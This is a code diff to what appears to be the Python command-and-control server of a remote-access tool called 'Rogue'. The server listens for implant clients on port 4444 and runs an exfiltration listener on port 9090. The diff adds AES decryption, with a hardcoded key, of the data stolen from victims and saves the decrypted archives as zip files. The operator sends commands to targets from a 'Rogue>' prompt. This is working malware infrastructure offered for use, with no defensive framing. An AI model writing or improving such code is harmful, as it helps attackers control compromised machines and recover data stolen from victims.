@@ -1,8 +1,10 @@
 #!/usr/bin/env python3
 import socket, threading, base64, os
 from Cryptodome.Cipher import AES
+from datetime import datetime
 
 SECRET_KEY = b'Sixteen byte key'
+EXFIL_DECRYPT_KEY = b'TrinityRogueKey!'
 PORT = 4444
 EXFIL_PORT = 9090
 clients = []
@@ -60,14 +62,28 @@ def exfil_listener():
             data += chunk
         conn.close()
 
-        filename = f"exfil_dump_{addr[0].replace('.', '_')}.bin"
-        with open(filename, "wb") as f:
+        raw_file = f"exfil_raw_{addr[0].replace('.', '_')}.bin"
+        with open(raw_file, "wb") as f:
             f.write(data)
-        print(f"[EXFIL] Saved: {filename}")
+        print(f"[EXFIL] Raw dump saved: {raw_file}")
+
+        try:
+            nonce, tag, ciphertext = data[:16], data[16:32], data[32:]
+            cipher = AES.new(EXFIL_DECRYPT_KEY, AES.MODE_EAX, nonce)
+            plaintext = cipher.decrypt_and_verify(ciphertext, tag)
+
+            ts = datetime.now().strftime("%Y%m%d_%H%M%S")
+            out_file = f"exfil_dec_{addr[0].replace('.', '_')}_{ts}.zip"
+            with open(out_file, "wb") as f:
+                f.write(plaintext)
+            print(f"[EXFIL] ✅ Decrypted archive saved: {out_file}")
+
+        except Exception as e:
+            print(f"[!] Decryption failed: {e}")
 
 def send_command():
     while True:
-        cmd = input("Rogue> ")
+        cmd = input("Rogue> ").strip()
         if cmd.lower() == "exit":
             break
         elif cmd.startswith("target"):
